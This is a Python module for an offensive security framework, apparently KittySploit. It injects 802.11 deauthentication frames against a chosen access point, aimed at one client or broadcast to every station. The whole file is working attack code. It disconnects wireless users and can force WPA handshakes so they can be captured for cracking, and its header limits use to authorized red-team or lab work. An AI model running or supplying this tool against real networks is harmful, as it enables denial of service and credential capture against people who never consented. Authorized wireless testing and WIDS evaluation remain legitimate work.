#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Targeted 802.11 deauthentication injection (authorized red-team / lab use only)."""

from __future__ import annotations
import time
from kittysploit import *
from lib.protocols.wlan.wlan_client import Wlan_capture


class Module(Auxiliary, Wlan_capture):
    __info__ = {
        "name": "WiFi Deauthentication Injector",
        "description": (
            "Send spec-compliant deauth/disassoc frames to encourage WPA handshakes or "
            "test WIDS (native frame builder + Python injection)."
        ),
        "author": ["KittySploit Team"],
        "tags": ["wlan", "wifi", "deauth", "injection", "802.11"],
        "references": ["https://attack.mitre.org/techniques/T1498/"],
        "attack": {
            "tactics": ["TA0040"],
            "techniques": ["T1498"],
            "prerequisites": [
                "Monitor-mode adapter with injection support",
                "Explicit authorization on target network",
            ],
        },
    }

    bssid = OptString("", "Target AP BSSID", required=True)
    client = OptString(
        "",
        "Client MAC to kick (empty = broadcast deauth to all stations)",
        required=False,
    )
    count = OptInteger(5, "Bursts of frame pairs to transmit", required=False)
    reason = OptInteger(7, "802.11 reason code", required=False)

    def check(self):
        if not str(self.bssid or "").strip():
            print_error("BSSID is required")
            return False
        return self.wlan_check_iface()

    def run(self):
        bssid = str(self.bssid).strip().lower()
        client = str(self.client or "").strip().lower()
        burst = max(1, int(self.count or 5))
        reason = int(self.reason or 7)
        frames = self.wlan_build_client_deauth(
            bssid, client or "ff:ff:ff:ff:ff:ff", broadcast=not client, reason=reason
        )

        print_info(f"Injecting deauth on {self.iface} → AP {bssid} client={client or 'broadcast'}")
        try:
            for i in range(burst):
                sent = self.wlan_inject_raw(frames, count=1)
                print_status(f"Burst {i + 1}/{burst}: {sent} frame(s) sent")
                time.sleep(0.2)
        except PermissionError:
            print_error("Injection permission denied — run elevated with an inject-capable iface")
            return False
        except OSError as exc:
            print_error(f"Injection failed: {exc}")
            return False

        print_success("Deauthentication burst complete")
        return True